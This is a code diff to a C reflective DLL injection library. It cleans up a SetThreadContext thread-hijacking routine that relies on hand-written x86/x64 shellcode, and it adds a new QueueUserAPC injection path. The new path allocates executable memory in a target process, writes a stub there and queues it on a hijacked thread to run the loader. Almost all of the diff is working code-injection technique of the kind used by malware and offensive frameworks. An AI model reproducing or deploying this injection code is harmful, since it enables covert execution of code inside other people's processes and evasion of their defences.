@@ -222,7 +222,7 @@ const unsigned char shell[] =
     0x41, 0x55,                                     // push        r13
     0x41, 0x56,                                     // push        r14
     0x41, 0x57,                                     // push        r15
-    0x90,//0x9C,                                           // pushfq
+    0x90,//0x9C,                                    // pushfq
     0x48, 0xB8, 0,0,0,0,0,0,0,0,                    // mov         rax,1122334455667788h RIP
     0x48, 0x89, 0x84, 0x24, 0x80 /*0x88*/, 0x00, 0x00, 0x00, // mov         qword ptr[rsp + 88h],rax
     0x48, 0xB8, 0,0,0,0,0,0,0,0,                    // mov         rax,1122334455667788h ARG
@@ -257,7 +257,7 @@ const unsigned char shell[] =
     0x59,                                           // pop         rcx
     0x5B,                                           // pop         rbx
     0x58,                                           // pop         rax
-    0x90,//0x9D,                                           // popfq
+    0x90,//0x9D,                                    // popfq
     0xC3,                                           // ret
 };
 #elif _M_IX86
@@ -268,7 +268,7 @@ const unsigned char shell[] =
     0x60,                   //pushad
     0x9C,                   //pushfd
     0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
-    0x89, 0x44, 0x24, 0x24,       //mov         dword ptr[esp + 24h],eax
+    0x89, 0x44, 0x24, 0x24, //mov         dword ptr[esp + 24h],eax
     0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
     0x50,                   //push        eax
     0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
@@ -283,13 +283,12 @@ const unsigned char shell[] =
 DWORD WINAPI DummyThreadFn(LPVOID lpThreadParamete)
 {
     for (;;)
-        Sleep(10);
+        SleepEx(10, TRUE);
 }
 
 BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
 {
-    PDWORD pdw = 0;
-    PDWORD64 pdw64 = 0;
+    PDWORD_PTR pdwptr = NULL;
     THREADENTRY32 te32;
     CONTEXT ctx;
     LPBYTE ptr = 0;
@@ -371,26 +370,23 @@ BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpRefle
             memcpy(ptr, shell, sizeof(shell));
 
 #if _M_IX86
-            pdw = (PDWORD)(((char*)ptr) + 5);
-            *pdw = ctx.Eip;
+            pdwptr = (PDWORD)(((char*)ptr) + 5);
+            *pdwptr = ctx.Eip;
 
-            pdw = (PDWORD)(((char*)ptr) + 14);
-            *pdw = (DWORD_PTR)lpParameter;
+            pdwptr = (PDWORD)(((char*)ptr) + 14);
+            *pdwptr = (DWORD_PTR)lpParameter;
 
-            pdw = (PDWORD)(((char*)ptr) + 20);
-            *pdw = (DWORD_PTR)lpReflectiveLoader;
+            pdwptr = (PDWORD)(((char*)ptr) + 20);
+            *pdwptr = (DWORD_PTR)lpReflectiveLoader;
 #elif _M_X64
-            pdw64 = (PDWORD64)(((char*)ptr) + 29);
-            assert(0 == *pdw64);
-            *pdw64 = ctx.Rip;
+            pdwptr = (PDWORD64)(((char*)ptr) + 29);
+            *pdwptr = ctx.Rip;
 
-            pdw64 = (PDWORD64)(((char*)ptr) + 47);
-            assert(0 == *pdw64);
-            *pdw64 = (DWORD_PTR)lpParameter;
+            pdwptr = (PDWORD64)(((char*)ptr) + 47);
+            *pdwptr = (DWORD_PTR)lpParameter;
 
-            pdw64 = (PDWORD64)(((char*)ptr) + 60);
-            assert(0 == *pdw64);
-            *pdw64 = (DWORD_PTR)lpReflectiveLoader;
+            pdwptr = (PDWORD64)(((char*)ptr) + 60);
+            *pdwptr = (DWORD_PTR)lpReflectiveLoader;
 #endif
 
             printf("\nWriting shellcode into target process.");
@@ -423,6 +419,112 @@ BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpRefle
         }
     }
     
+    return TRUE;
+}
+
+#pragma runtime_checks("", off)
+VOID CALLBACK APCProc(ULONG_PTR dwParam)
+{
+    // Check activation context stack
+#if _M_IX86
+    if (0 == __readfsdword(0x1a8)) 
+#elif _M_X64
+    if (0 == __readgsqword(0x2c8))
+#endif
+    {
+        return;
+    }
+
+    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)dwParam;
+    lpReflectiveLoader(NULL);
+}
+
+void APCProcEnd()
+{
+}
+#pragma runtime_checks("", restore)
+
+BOOL InjectUsingQueueUserAPC(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
+{
+    PDWORD_PTR pdwptr = NULL;
+    THREADENTRY32 te32;
+    CONTEXT ctx;
+    LPBYTE ptr = 0;
+    PVOID mem = 0;
+    int found = 0;
+    HANDLE hSnap = NULL;
+    DWORD processId = GetProcessId(hProcess);
+    DWORD currentThreadId = GetCurrentThreadId();
+    DWORD targetThreadId = 0;
+    HANDLE targetThread = NULL;
+
+    if (processId == GetCurrentProcessId())
+    {
+        CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
+        YieldProcessor();
+    }
+
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);;
+
+    te32.dwSize = sizeof(te32);
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    Thread32First(hSnap, &te32);
+    printf("\nFinding a thread to hijack.\n");
+
+    while (Thread32Next(hSnap, &te32))
+    {
+        if (te32.th32OwnerProcessID == processId)
+        {
+            if (currentThreadId == te32.th32ThreadID)
+            {
+                continue;
+            }
+
+            targetThreadId = te32.th32ThreadID;
+
+            printf("\nTarget thread found. Thread ID: %d", targetThreadId);
+
+            printf("\nAllocating memory in target process.");
+
+            mem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+            if (!mem)
+            {
+                printf("\nError: Unable to allocate memory in target process (%d)", GetLastError());
+                continue;
+            }
+
+            printf("\nMemory allocated at %p", mem);
+            printf("\nOpening target thread handle %d.", targetThreadId);
+
+            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
+
+            if (!targetThread)
+            {
+                printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());
+                continue;
+            }
+
+            printf("\nWriting shellcode into target process.");
+
+            if (!WriteProcessMemory(hProcess, mem, &APCProc, (DWORD_PTR)&APCProcEnd - (DWORD_PTR)&APCProc, NULL))
+            {
+                continue;
+            }
+
+            printf("\nHijacking target thread.");
+
+            if (!QueueUserAPC((PAPCFUNC)mem, targetThread, (DWORD_PTR)lpReflectiveLoader))
+            {
+                printf("\nError: Unable to hijack target thread (%d)\n", GetLastError());
+                continue;
+            }
+
+            CloseHandle(targetThread);
+        }
+    }
+
     return TRUE;
 }
 
@@ -459,6 +561,9 @@ BOOL WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength
 
     case kSetThreadContext:
         return InjectUsingSetThreadContext(hProcess, lpReflectiveLoader, lpParameter);
+
+    case kQueueUserAPC:
+        return InjectUsingQueueUserAPC(hProcess, lpReflectiveLoader, lpParameter);
     }
 
     return FALSE;
